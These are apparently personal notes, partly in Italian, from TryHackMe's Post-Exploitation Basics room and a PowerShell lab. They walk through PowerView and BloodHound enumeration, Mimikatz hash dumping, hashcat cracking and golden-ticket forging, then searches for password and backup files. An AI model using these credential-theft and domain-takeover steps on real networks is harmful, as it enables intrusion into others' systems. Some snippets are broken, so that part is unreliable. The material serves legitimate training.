

From Post-Exploitation Basics of TryHackMe.
(Immagini prese da TryHackMe)

Start Powershell

powershell -ep bypass


Start PowerView:
. .\Downloads\PowerView.ps1

Enumerate the domain users - Get-NetUser \| select cn 

PS C:\Users\Administrator> Get-NetUser \| select cn

cn\\
Administrator\\
Guest\\
krbtgt\\
Machine-1\\
Admin2\\
Machine-2\\
POST{P0W3RV13W_FTW}\\
sshd


Enumerate the domain groups - Get-NetGroup -GroupName \*admin\*
PS C:\Users\Administrator> Get-NetGroup -GroupName \*admin\*
Administrators\\
Hyper-V Administrators\\
Storage Replica Administrators\\
Schema Admins\\
Enterprise Admins\\
Domain Admins\\
Key Admins\\
Enterprise Key Admins\\
DnsAdmins

PowerView Tricks:
https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993



Folder: 
PS C:\Users\Administrator> Invoke-ShareFinder
\\Domain-Controller.CONTROLLER.local\ADMIN$     - Remote Admin 
\\Domain-Controller.CONTROLLER.local\C$         - Default share
\\Domain-Controller.CONTROLLER.local\IPC$       - Remote IPC
\\Domain-Controller.CONTROLLER.local\NETLOGON   - Logon server share
\\Domain-Controller.CONTROLLER.local\Share      -
\\Domain-Controller.CONTROLLER.local\SYSVOL     - Logon server share




What operating system is running inside of the network:
PS C:\Users\Administrator> Get-NetComputer -fulldata | select operatingsystem

operatingsystem
---------------
Windows Server 2019 Standard
Windows 10 Enterprise Evaluation
Windows 10 Enterprise Evaluation




#### BloodHound

##### BloodHound Installation -

1.) ```apt-get install bloodhound```  

2.) ```neo4j console``` - default credentials -> neo4j:neo4j

##### Getting loot w/ SharpHound -

1.) ```powershell -ep bypass``` same as with PowerView

2.) ```. .\Downloads\SharpHound.ps1```

3.) ```Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip```


4.) Transfer the loot.zip folder to your Attacker Machine

note: you can use scp to transfer the file if you’re using ssh


##### Mapping the network w/ BloodHound -

1.) ```bloodhound``` Run this on your attacker machine not the victim machine

2.) Sign In using the same credentials you set with Neo4j
3.) Import the loot.zip file previously created

note: On some versions of BloodHound the import button does not work to get around this simply drag and drop the loot.zip folder into Bloodhound to import the .json files

4.) To view the graphed network open the menu and select queries this will give you a list of pre-compiled queries to choose from.



#### Mimikatz

##### Dump Hashes w/ mimikatz -

1.) ```cd Downloads && mimikatz.exe``` this will cd into the directory that mimikatz is kept as well as run the mimikatz binary

2.) ```privilege::debug``` ensure that the output is "Privilege '20' ok" - This ensures that you're running mimikatz as an administrator; if you don't run mimikatz as an administrator, mimikatz will not run properly

3.) ```lsadump::lsa /patch``` Dump those hashes!

![Dump mimikatz](/assets/img/posts/post-exploitation/mimikatz_NTLM.png)


##### Crack those hashes w/ hashcat﻿

1.) ```hashcat -m 1000 <hash> rockyou.txt```   



#### Golden Ticket (Mimikatz)
**Dump the krbtgt Hash**

﻿1.) ```cd downloads && mimikatz.exe```    

2.) ```privilege::debug``` ensure this outputs [privilege "20" ok]

﻿3.) ```lsadump::lsa /inject /name:krbtgt``` This dumps the hash and security identifier of the Kerberos Ticket Granting Ticket account allowing you to create a golden ticket

![Krgtgt](/assets/img/posts/post-exploitation/create_krbtgt.png)

Take note of what is outlined in red you'll need it to create the golden ticket

**Create a Golden Ticket**

﻿1.) ```kerberos::golden /user: /domain: /sid: /krbtgt: /id:```

![Golden ticket](/assets/img/posts/post-exploitation/golden_ticket1.png)



**Use the Golden Ticket to access other machine**

1.) ```misc::cmd``` - This will open a new command prompt with elevated privileges to all machines

2.) Access other Machines! - You will now have another command prompt with access to all other machines on the network

Note that to view the devices connected in network, you can use the commands:
 - ```net view```
 - ```arp -a```

![Access Other Machine](/assets/img/posts/post-exploitation/access_other_machine.png)






Altri Comandi Powershell:

Cercare un file con il nome:
```
Get-ChildItem -Path C:\ -Include *interesting-file.txt* -File -Recurse -ErrorAction SilentlyContinue

    Directory: C:\Program Files


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        10/3/2019  11:38 PM             23 interesting-file.txt.txt

```



Base64 decode the file b64.txt on Windows. 

```
PS C:\Users\Administrator> Get-ChildItem -Path C:/ -Include b64.txt -Recurse -File


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        10/3/2019  11:56 PM            432 b64.txt

PS C:\Users\Administrator> certutil -decode "C:\Users\Administrator\Desktop\b64.txt" decode.txt
Input Length = 432
Output Length = 323
CertUtil: -decode command completed successfully.

PS C:\Users\Administrator> Get-Content .\decode.txt
this is the flag - ihopeyoudidthisonwindows
the rest is garbage
the rest is garbage
the rest is garbage
the rest is garbage
the rest is garbage
the rest is garbage
the rest is garbage
the rest is garbage
the rest is garbage
the rest is garbage
the rest is garbage
the rest is garbage
the rest is garbage
the rest is garbage

```






How many users are there on the machine?
```
PS C:\Users\Administrator> Get-LocalUser

Name           Enabled Description
----           ------- -----------
Administrator  True    Built-in account for administering the computer/domain
DefaultAccount False   A user account managed by the system.
duck           True
duck2          True
Guest          False   Built-in account for guest access to the computer/domain
```

Which local user does this SID(S-1-5-21-1394777289-3961777894-1791813945-501) belong to?
```
PS C:\Users\Administrator> Get-LocalUser -SID "S-1-5-21-1394777289-3961777894-1791813945-501"

Name  Enabled Description
----  ------- -----------
Guest False   Built-in account for guest access to the computer/domain
```

How many users have their password required values set to False?
```
PS C:\Users\Administrator> Get-LocalUser | Where-Object -Property PasswordRequired -Match false

Name           Enabled Description
----           ------- -----------
DefaultAccount False   A user account managed by the system.
duck           True
duck2          True
Guest          False   Built-in account for guest access to the computer/domain
```




What command did you use to get the IP address info?
```
Get-NetIPAddress
```

What is the remote address of the local port listening on port 445?
```
GEt-NetTCPConnection | Where-Object -Property State -Match Listen | measure
```

Find the contents of a backup file.
```
PS C:\Users\Administrator>
PS C:\Users\Administrator> Get-ChildItem -Path C:\ -Include *.bak* -File -Recurse -ErrorAction SilentlyContinue


    Directory: C:\Program Files (x86)\Internet Explorer


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        10/4/2019  12:42 AM             12 passwords.bak.txt
PS C:\Users\Administrator> Get-Content "C:\Program Files (x86)\Internet Explorer\passwords.bak.txt"
backpassflag
```

Search for all files containing API_KEY
```

```


What command do you do to list all the running processes?
```
Get-Process
```

What is the path of the scheduled task called new-sched-task?
```
PS C:\Users\Administrator> Get-ScheduledTask -TaskName new-sched-task

TaskPath                                       TaskName                          State
--------                                       --------                          -----
\                                              new-sched-task                    Ready
```

Who is the owner of the C:\ 
```
PS C:\Users\Administrator> Get-Acl c:/


    Directory:


Path Owner                       Access
---- -----                       ------
C:\  NT SERVICE\TrustedInstaller CREATOR OWNER Allow  268435456...
```



Se si ha una cartella chiamata "emails" e si vuole cercare la parola "password"

```
$path = "C:\Users\Administrator\Desktop\emails\*"
$string_pattern = "password"
$command = Get-ChildItem -Path $path -Recurse | Select-String -Pattern $
echo $command
```


Testare la porte tra 130 a 140 (incluse)
```
for($i=130; $i -le 140; $i++){
    Test-NetConnection localhost -Port $i
}
```